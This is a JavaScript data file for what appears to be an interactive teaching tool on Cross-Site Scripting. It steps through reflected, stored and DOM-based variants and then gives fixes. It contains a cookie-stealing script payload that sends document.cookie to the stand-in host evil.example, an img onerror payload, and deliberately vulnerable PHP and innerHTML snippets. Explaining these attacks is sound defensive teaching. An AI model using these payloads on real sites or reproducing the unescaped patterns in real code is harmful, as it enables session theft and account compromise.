// Cross-Site Scripting (XSS) — CWE-79. Three delivery mechanisms (reflected,
// stored, DOM-based) share one root cause: untrusted input reaches the page as
// markup instead of data. Every "rendered output" panel below is inert text —
// nothing here is ever actually parsed as HTML by the app itself.

const REFLECTED = '#ff6b8b';
const STORED = '#ff8f5e';
const DOM = '#c77dff';
const FIX = '#42d6a4';

export const XSS_STEPS = [
  {
    id: 'reflected-request',
    category: 'Reflected XSS',
    title: 'A search box echoes its input',
    accentColor: REFLECTED,
    summary:
      'A "did you mean" search page reflects the query string straight back into the page. The victim clicks a link an attacker crafted — the payload rides in the URL.',
    panels: [
      {
        title: 'URL the victim clicks',
        lines: [
          {
            id: 'url',
            text: 'https://shop.example/search?q=<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
            tone: 'danger',
            note: {
              name: 'q parameter',
              exampleValue: '<script>…</script>',
              detail:
                'Nothing about this URL looks obviously malicious to the victim if it is shortened or hidden behind a link — the payload is just query-string text at this point, inert until the server does something unsafe with it.',
              protocol: 'XSS',
              kind: 'reflected',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'reflected-response',
    category: 'Reflected XSS',
    title: 'The server writes the query back into HTML',
    accentColor: REFLECTED,
    summary:
      'The handler builds the response by string-concatenating the raw query parameter into the page — no encoding, no escaping. The attacker\'s markup becomes real markup.',
    panels: [
      {
        title: 'search.php (vulnerable)',
        lines: [
          { id: 'l1', text: '$q = $_GET["q"];' },
          {
            id: 'l2',
            text: 'echo "<p>Results for: " . $q . "</p>";',
            tone: 'danger',
            note: {
              name: 'unescaped concatenation',
              detail:
                'The query parameter is dropped directly into the HTML response body. Anything the attacker put in `q` — including a <script> tag — becomes part of the document the browser parses.',
              protocol: 'XSS',
              kind: 'reflected',
            },
          },
        ],
      },
      {
        title: 'HTML the browser receives',
        lines: [
          { id: 'r1', text: '<p>Results for: <script>fetch("https://evil.example/steal?c="+document.cookie)</script></p>', tone: 'danger' },
        ],
      },
    ],
  },
  {
    id: 'reflected-execute',
    category: 'Reflected XSS',
    title: 'The script runs — as the site, not the attacker',
    accentColor: REFLECTED,
    summary:
      'The browser has no way to tell this <script> tag apart from one the site meant to serve. It executes with the page\'s own origin, so it can read the page\'s cookies and call its APIs.',
    panels: [
      {
        title: 'What just executed, in the victim\'s browser',
        lines: [
          {
            id: 'e1',
            text: 'fetch("https://evil.example/steal?c=" + document.cookie)',
            tone: 'danger',
            note: {
              name: 'same-origin execution',
              detail:
                'Because the script tag came back from shop.example, the browser runs it as shop.example — with access to shop.example\'s cookies, localStorage, and any DOM API the page itself could use. This is the whole trick: XSS doesn\'t attack the browser, it borrows the site\'s own trust.',
              protocol: 'XSS',
              kind: 'impact',
            },
          },
          {
            id: 'e2',
            text: '// → attacker\'s server now has the victim\'s session cookie',
            tone: 'danger',
          },
        ],
      },
    ],
  },
  {
    id: 'stored-submit',
    category: 'Stored XSS',
    title: 'A comment form saves markup verbatim',
    accentColor: STORED,
    summary:
      'This time the attacker doesn\'t need to trick anyone into clicking a link. They just post a comment. The payload lands in the database, waiting for the next visitor.',
    panels: [
      {
        title: 'comments.php (vulnerable)',
        lines: [
          { id: 's1', text: '$body = $_POST["comment"];' },
          {
            id: 's2',
            text: 'db.insert("comments", { body: $body });',
            tone: 'danger',
            note: {
              name: 'unsanitized write',
              detail:
                'The raw comment text — including any HTML the attacker included — is written to storage untouched. The vulnerability isn\'t here yet; it\'s dormant until this row gets rendered to someone else.',
              protocol: 'XSS',
              kind: 'stored',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'stored-serve',
    category: 'Stored XSS',
    title: 'Every later visitor gets the payload',
    accentColor: STORED,
    summary:
      'The page template drops each stored comment into the DOM the same unsafe way the search box did. Now the exploit fires automatically for anyone who views the page — no link to click, no social engineering needed.',
    panels: [
      {
        title: 'page.php (rendering stored comments)',
        lines: [
          { id: 'p1', text: 'foreach (comments as c) {' },
          {
            id: 'p2',
            text: '  echo "<div class=\'comment\'>" . c.body . "</div>";',
            tone: 'danger',
            note: {
              name: 'stored payload rendered',
              detail:
                'This is why stored XSS is considered more dangerous than reflected: one successful post compromises every subsequent visitor — other customers, moderators, even admins reading the comment queue — until the row is removed.',
              protocol: 'XSS',
              kind: 'stored',
            },
          },
          { id: 'p3', text: '}' },
        ],
      },
    ],
  },
  {
    id: 'dom-based',
    category: 'DOM-based XSS',
    title: 'Client-side code writes untrusted input into the DOM',
    accentColor: DOM,
    summary:
      'No server round-trip at all this time. A client-side script reads part of the URL and writes it straight into the page. The "vulnerable" code never left the browser.',
    panels: [
      {
        title: 'app.js (vulnerable sink)',
        lines: [
          { id: 'd1', text: '// URL: https://shop.example/#<img src=x onerror=alert(document.domain)>' },
          {
            id: 'd2',
            text: 'const name = location.hash.slice(1);',
            note: {
              name: 'untrusted source',
              detail:
                'location.hash is fully attacker-controlled and never touches the server, so server-side filtering can\'t help here — the whole bug lives client-side.',
              protocol: 'XSS',
              kind: 'dom',
            },
          },
          {
            id: 'd3',
            text: 'document.getElementById("greeting").innerHTML = "Hi, " + name;',
            tone: 'danger',
            note: {
              name: 'dangerous sink: innerHTML',
              detail:
                'innerHTML parses its argument as HTML. Any "source → sink" path like this (location.hash, document.referrer, postMessage data) reaching innerHTML, document.write, or eval is a DOM XSS sink regardless of what the server ever sent.',
              protocol: 'XSS',
              kind: 'dom',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'mitigation',
    category: 'Mitigation',
    title: 'Treat input as data, never as markup',
    accentColor: FIX,
    summary:
      'The fix is the same shape in all three variants: never let untrusted text become HTML structure. Encode on output, prefer safe APIs, and add defense-in-depth so one missed spot isn\'t catastrophic.',
    panels: [
      {
        title: 'Fixed',
        lines: [
          {
            id: 'f1',
            text: 'echo "<p>Results for: " . htmlspecialchars($q) . "</p>";',
            tone: 'safe',
            note: {
              name: 'context-aware output encoding',
              detail:
                'htmlspecialchars() (or an auto-escaping template engine) turns < > " \' & into harmless entities, so a <script> tag arrives as visible text, not as markup.',
              protocol: 'XSS',
              kind: 'fix',
            },
          },
          {
            id: 'f2',
            text: 'el.textContent = "Hi, " + name;  // never .innerHTML with untrusted data',
            tone: 'safe',
            note: {
              name: 'safe DOM API',
              detail:
                'textContent (or el.innerText) inserts a literal string — the browser never re-parses it as HTML, so there is no sink to exploit.',
              protocol: 'XSS',
              kind: 'fix',
            },
          },
          {
            id: 'f3',
            text: "Content-Security-Policy: script-src 'self'",
            tone: 'safe',
            note: {
              name: 'CSP as a safety net',
              detail:
                'A strict Content-Security-Policy blocks inline/injected scripts from executing even if an encoding bug slips through — defense in depth, not a substitute for fixing the sink.',
              protocol: 'XSS',
              kind: 'fix',
            },
          },
          {
            id: 'f4',
            text: 'Set-Cookie: session=…; HttpOnly; Secure; SameSite=Strict',
            tone: 'safe',
            note: {
              name: 'HttpOnly cookies',
              detail:
                'Marking the session cookie HttpOnly means document.cookie can\'t read it at all — so even a successful XSS can\'t exfiltrate the session token directly.',
              protocol: 'XSS',
              kind: 'fix',
            },
          },
        ],
      },
    ],
  },
];

export default XSS_STEPS;
